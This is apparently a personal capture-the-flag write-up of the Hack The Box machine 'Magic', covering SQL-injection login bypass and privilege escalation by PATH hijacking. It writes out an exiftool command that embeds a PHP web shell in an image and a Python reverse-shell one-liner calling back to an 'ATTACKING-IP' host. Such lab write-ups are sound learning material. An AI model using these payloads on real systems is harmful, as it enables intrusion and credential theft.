So, that being said, today I pwned my first Hack The Box machine - Magic!

_Thanks to [Fahmi's Magic Walkthrough](https://medium.com/@fahmi1597/hack-the-box-magic-10-10-10-185-scratch-f534fce85b66)!_

So, I was presented with a webserver with 2 ports in use. Started to do recon on the website and found a login panel - bypassed the login using simple SQL injection. 

An image upload interface greeted me, and is ready to accept png, jpg and gif formats ONLY. There was a chance to get access using a php-reverse-shell but no, it did not accept any _.php_ format or even I tried _.php.png_, bad luck! This was the time for me to learn this **first trick**

### How to implement reverse shell inside an image?

* Using this tool - exiftool - we can view the metadata of an image and we could use the same to alter it as well.

```shell
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']);?>' image.png
```

What this command does is, it alters the Comment parameter of the image.

As we have used, $_GET we could send the data through the url in cmd parameter `...image.php.png?cmd=<any shell command>` and this will run the shell commands and give the output in the browser.

Checked if python is available or not, it was not but python3 was!

Then used the python one liner reverse shell to get access to the shell. Passed the one liner through `cmd` parameter and started listening on some port `nc -nlvp 1234`.

Python One Liner Reverse Shell:
```shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Did a bit recon as `www-data`, found credentials of mysql database which lead to mysqldump of user's credentials. 

Next step was privilege escalation to root!

Ran `linpeas.sh` and found out some SUID binaries, and one specific that looked interesting was `sysinfo` which was linked to `lshw`. 
**Time for the next lesson!**

### How to escalate using PATH variable and SUID?
After doing some recon, we knew that when `sysinfo` was running a service called `lshw` and therefore if we could run same command before `sysinfo`, we could possibly achieve our task.

Created a new file in `/tmp/cardinal/lshw` and put that python reverse shell in it and made it executable.

What we have to do now, is that specify this location in the PATH variable. 

```shell
export PATH=/tmp/cardinal/:$PATH
```

And then we came to our terminal and started the reverse shell and then in the user's terminal executed `sysinfo`. 

Viola!
